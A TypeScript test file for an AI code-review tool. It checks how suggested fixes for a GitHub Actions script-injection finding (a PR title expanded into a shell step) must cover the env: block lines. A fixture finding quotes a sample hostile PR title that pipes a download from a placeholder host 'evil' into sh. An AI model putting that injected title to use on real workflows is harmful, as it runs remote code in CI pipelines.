import { readFileSync } from "node:fs";
import type { Finding } from "@omniralph/shared";
import { describe, expect, it } from "vitest";
import { parseDiff, type DiffFile } from "./diff.js";
import { planReview } from "./plan.js";
import { buildPrompt, SUGGESTION_RULE, type ReviewProfileConfig } from "./prompt.js";
import { REVIEW_SYSTEM_PROMPT } from "./providers/claude-agent.js";
import { filterToDiff } from "./providers/findings-output.js";

// A step that already has an `env:` block (lines 14-15) gains script injection on
// its `run:` line (16). The fix has to add `PR_TITLE` to that `env:` block, which
// lies outside a finding on line 16 alone.
const files = parseDiff(
  readFileSync(new URL("../test/fixtures/workflow-injection.diff", import.meta.url), "utf8"),
);
const PATH = ".github/workflows/ci.yml";

const standard: ReviewProfileConfig = {
  id: "standard",
  name: "Standard",
  maxTokensPerReview: 200_000,
  maxFiles: 40,
  allowRepoExploration: true,
};

/** The head-side lines the diff shows, by line number. */
function headLines(diffFiles: readonly DiffFile[]): Map<number, string> {
  const lines = new Map<number, string>();
  for (const hunk of diffFiles.find((f) => f.path === PATH)!.hunks) {
    for (const line of hunk.lines) {
      if (line.newLine !== null) lines.set(line.newLine, line.content);
    }
  }
  return lines;
}

/** What GitHub's "Commit suggestion" does: replace exactly startLine..endLine. */
function applySuggestion(lines: Map<number, string>, finding: Finding): string[] {
  const numbers = [...lines.keys()].sort((a, b) => a - b);
  const out: string[] = [];
  for (const n of numbers) {
    if (n === finding.startLine) out.push(...finding.suggestion!.replace(/\n$/, "").split("\n"));
    if (n < finding.startLine || n > finding.endLine) out.push(lines.get(n)!);
  }
  return out;
}

const injection = (overrides: Partial<Finding>): Finding => ({
  path: PATH,
  startLine: 16,
  endLine: 16,
  severity: "high",
  category: "security",
  title: "Script injection via the PR title",
  body: '`${{ github.event.pull_request.title }}` is expanded into the shell script, so a PR title like `"; curl evil | sh; "` runs commands.',
  confidence: 0.9,
  ...overrides,
});

describe("suggestions whose fix spans lines outside the finding", () => {
  it("tells the reviewer a suggestion replaces exactly startLine..endLine and must be complete", () => {
    expect(SUGGESTION_RULE).toContain("exactly lines startLine..endLine");
    expect(SUGGESTION_RULE).toContain("complete, working fix");
    expect(SUGGESTION_RULE).toContain("widen startLine..endLine");
    expect(SUGGESTION_RULE).toContain("describe the whole fix in body");

    const plan = planReview(files, standard);
    const prompt = buildPrompt({
      config: { profile: standard },
      files: plan.tasks[0]!.files,
      changeRequest: { title: "Report coverage" },
    });
    expect(prompt.stablePrefix).toContain(SUGGESTION_RULE);
    expect(prompt.text).toContain(
      'run: echo "Coverage for: ${{ github.event.pull_request.title }}"',
    );
    expect(REVIEW_SYSTEM_PROMPT).toContain(SUGGESTION_RULE);
  });

  it("shows why a single-line suggestion is not a fix here", () => {
    const narrow = injection({ suggestion: '        run: echo "Coverage for: $PR_TITLE"' });
    const applied = applySuggestion(headLines(files), narrow);
    expect(applied).toContain('        run: echo "Coverage for: $PR_TITLE"');
    // $PR_TITLE is never set: the injection is gone, but the step prints an empty title.
    expect(applied.some((line) => line.includes("PR_TITLE:"))).toBe(false);
  });

  it("keeps a finding widened to every line the fix changes, and applying it fixes the step", () => {
    const widened = injection({
      startLine: 14,
      endLine: 16,
      suggestion: [
        "        env:",
        "          NODE_ENV: test",
        "          PR_TITLE: ${{ github.event.pull_request.title }}",
        '        run: echo "Coverage for: $PR_TITLE"',
      ].join("\n"),
    });
    const { inside, outside } = filterToDiff([widened], files);
    expect(inside).toEqual([widened]);
    expect(outside).toEqual([]);

    expect(applySuggestion(headLines(files), widened)).toEqual([
      "      - name: Report coverage",
      "        env:",
      "          NODE_ENV: test",
      "          PR_TITLE: ${{ github.event.pull_request.title }}",
      '        run: echo "Coverage for: $PR_TITLE"',
      "      - name: Done",
      "        run: echo done",
    ]);
  });

  it("keeps a finding without a suggestion that describes the fix in its body", () => {
    const described = injection({
      body: 'Pass the title through the step\'s `env:` block (`PR_TITLE: ${{ github.event.pull_request.title }}`) and use `"$PR_TITLE"` in `run:`.',
    });
    expect(filterToDiff([described], files).inside).toEqual([described]);
  });

  it("drops a widened finding that leaves the hunk", () => {
    const tooWide = injection({ startLine: 9, endLine: 16, suggestion: "        run: true" });
    expect(filterToDiff([tooWide], files)).toEqual({ inside: [], outside: [tooWide] });
  });
});
